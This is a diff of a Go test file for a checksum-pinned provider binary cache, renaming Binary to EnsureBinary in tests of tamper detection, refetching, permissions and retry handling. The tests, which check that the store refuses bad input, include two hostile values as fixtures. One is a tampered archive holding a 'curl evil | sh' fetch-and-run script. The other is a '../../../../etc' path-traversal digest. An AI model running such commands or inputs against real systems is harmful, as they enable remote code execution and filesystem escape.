@@ -1,4 +1,4 @@
-package providers
+package executables
 
 import (
 	"archive/tar"
@@ -165,7 +165,7 @@ func TestAFetchedProviderLandsInTheCache(t *testing.T) {
 	asset := AssetName(KindProvider, "aws", testVersion, "linux", "amd64")
 	digest := pinsOf(t, store)[asset]
 
-	path, err := store.Binary(context.Background(), KindProvider, "aws", store.Platform, digest)
+	path, err := store.EnsureBinary(context.Background(), KindProvider, "aws", store.Platform, digest)
 	if err != nil {
 		t.Fatalf("Binary: %v", err)
 	}
@@ -183,7 +183,7 @@ func TestAFetchedProviderLandsInTheCache(t *testing.T) {
 	}
 
 	before := rel.requests.Load()
-	if _, err := store.Binary(context.Background(), KindProvider, "aws", store.Platform, digest); err != nil {
+	if _, err := store.EnsureBinary(context.Background(), KindProvider, "aws", store.Platform, digest); err != nil {
 		t.Fatalf("second Binary: %v", err)
 	}
 	if rel.requests.Load() != before {
@@ -201,7 +201,7 @@ func TestATamperedArchiveFailsVerificationAndNothingLandsInTheCache(t *testing.T
 
 	rel.archives[asset] = archiveWith(t, "provider-aws", []byte("#!/bin/sh\ncurl evil | sh\n"))
 
-	_, err := store.Binary(context.Background(), KindProvider, "aws", store.Platform, pinned)
+	_, err := store.EnsureBinary(context.Background(), KindProvider, "aws", store.Platform, pinned)
 	if err == nil {
 		t.Fatal("Binary() error = nil, want the tampered archive refused")
 	}
@@ -222,7 +222,7 @@ func TestACachedProviderAlteredAfterItsInstallIsRefetched(t *testing.T) {
 	asset := AssetName(KindProvider, "aws", testVersion, "linux", "amd64")
 	digest := pinsOf(t, store)[asset]
 
-	path, err := store.Binary(context.Background(), KindProvider, "aws", store.Platform, digest)
+	path, err := store.EnsureBinary(context.Background(), KindProvider, "aws", store.Platform, digest)
 	if err != nil {
 		t.Fatalf("Binary: %v", err)
 	}
@@ -231,7 +231,7 @@ func TestACachedProviderAlteredAfterItsInstallIsRefetched(t *testing.T) {
 	}
 
 	before := rel.requests.Load()
-	again, err := store.Binary(context.Background(), KindProvider, "aws", store.Platform, digest)
+	again, err := store.EnsureBinary(context.Background(), KindProvider, "aws", store.Platform, digest)
 	if err != nil {
 		t.Fatalf("second Binary: %v", err)
 	}
@@ -258,7 +258,7 @@ func TestACachedProviderAlteredAfterItsInstallIsRefusedWhenItCannotBeRefetched(t
 	asset := AssetName(KindProvider, "aws", testVersion, "linux", "amd64")
 	digest := pinsOf(t, store)[asset]
 
-	path, err := store.Binary(context.Background(), KindProvider, "aws", store.Platform, digest)
+	path, err := store.EnsureBinary(context.Background(), KindProvider, "aws", store.Platform, digest)
 	if err != nil {
 		t.Fatalf("Binary: %v", err)
 	}
@@ -267,7 +267,7 @@ func TestACachedProviderAlteredAfterItsInstallIsRefusedWhenItCannotBeRefetched(t
 	}
 	rel.server.Close()
 
-	if _, err := store.Binary(context.Background(), KindProvider, "aws", store.Platform, digest); err == nil {
+	if _, err := store.EnsureBinary(context.Background(), KindProvider, "aws", store.Platform, digest); err == nil {
 		t.Fatal("Binary() error = nil, want the altered cache entry refused")
 	}
 }
@@ -280,12 +280,12 @@ func TestALockPinningAnotherDigestIsNeverServedFromTheCache(t *testing.T) {
 	asset := AssetName(KindProvider, "aws", testVersion, "linux", "amd64")
 	digest := pinsOf(t, store)[asset]
 
-	if _, err := store.Binary(context.Background(), KindProvider, "aws", store.Platform, digest); err != nil {
+	if _, err := store.EnsureBinary(context.Background(), KindProvider, "aws", store.Platform, digest); err != nil {
 		t.Fatalf("Binary: %v", err)
 	}
 
 	other := strings.Repeat("a", 64)
-	_, err := store.Binary(context.Background(), KindProvider, "aws", store.Platform, other)
+	_, err := store.EnsureBinary(context.Background(), KindProvider, "aws", store.Platform, other)
 	if err == nil {
 		t.Fatal("Binary() error = nil, want the archive the release serves refused against the other pin")
 	}
@@ -300,7 +300,7 @@ func TestADigestThatIsNotASha256IsRefusedRatherThanMadeIntoAPath(t *testing.T) {
 	rel := fakeRelease(t, "aws")
 	store := storeFor(t, rel)
 
-	_, err := store.Binary(context.Background(), KindProvider, "aws", store.Platform, "../../../../etc")
+	_, err := store.EnsureBinary(context.Background(), KindProvider, "aws", store.Platform, "../../../../etc")
 	if err == nil {
 		t.Fatal("Binary() error = nil, want a digest that is not a sha256 refused")
 	}
@@ -318,7 +318,7 @@ func TestTheProviderCacheIsReadableOnlyByTheUserThatFetchedIt(t *testing.T) {
 	asset := AssetName(KindProvider, "aws", testVersion, "linux", "amd64")
 	digest := pinsOf(t, store)[asset]
 
-	path, err := store.Binary(context.Background(), KindProvider, "aws", store.Platform, digest)
+	path, err := store.EnsureBinary(context.Background(), KindProvider, "aws", store.Platform, digest)
 	if err != nil {
 		t.Fatalf("Binary: %v", err)
 	}
@@ -350,7 +350,7 @@ func TestAProvidersDirSkipsTheFetchEntirely(t *testing.T) {
 		t.Fatal(err)
 	}
 
-	path, err := store.Binary(context.Background(), KindProvider, "aws", store.Platform, "")
+	path, err := store.EnsureBinary(context.Background(), KindProvider, "aws", store.Platform, "")
 	if err != nil {
 		t.Fatalf("Binary: %v", err)
 	}
@@ -369,7 +369,7 @@ func TestAProvidersDirThatContainsNothingSaysSo(t *testing.T) {
 	store := storeFor(t, rel)
 	store.Override = t.TempDir()
 
-	_, err := store.Binary(context.Background(), KindProvider, "aws", store.Platform, "")
+	_, err := store.EnsureBinary(context.Background(), KindProvider, "aws", store.Platform, "")
 	if err == nil {
 		t.Fatal("Binary() error = nil, want the empty providers directory refused")
 	}
@@ -392,7 +392,7 @@ func TestAThrottledReleaseIsRetriedAndThenServed(t *testing.T) {
 	store.Sleep = func(d time.Duration) { waited = append(waited, d) }
 	rel.statuses[asset] = []int{http.StatusTooManyRequests, http.StatusServiceUnavailable}
 
-	if _, err := store.Binary(context.Background(), KindProvider, "aws", store.Platform, digest); err != nil {
+	if _, err := store.EnsureBinary(context.Background(), KindProvider, "aws", store.Platform, digest); err != nil {
 		t.Fatalf("Binary: %v", err)
 	}
 	if len(waited) != 2 {
@@ -420,7 +420,7 @@ func TestAReleaseThatStaysThrottledGivesUpNamingTheThrottle(t *testing.T) {
 		rel.statuses[asset] = append(rel.statuses[asset], http.StatusTooManyRequests)
 	}
 
-	_, err := store.Binary(context.Background(), KindProvider, "aws", store.Platform, digest)
+	_, err := store.EnsureBinary(context.Background(), KindProvider, "aws", store.Platform, digest)
 	if err == nil {
 		t.Fatal("Binary() error = nil, want the throttle reported")
 	}
@@ -436,7 +436,7 @@ func TestAMissingArchiveIsNotRetried(t *testing.T) {
 	store := storeFor(t, rel)
 
 	before := rel.requests.Load()
-	if _, err := store.Binary(context.Background(), KindProvider, "gcp", store.Platform, strings.Repeat("0", 64)); err == nil {
+	if _, err := store.EnsureBinary(context.Background(), KindProvider, "gcp", store.Platform, strings.Repeat("0", 64)); err == nil {
 		t.Fatal("Binary() error = nil, want the missing archive refused")
 	}
 	if got := rel.requests.Load() - before; got != 1 {
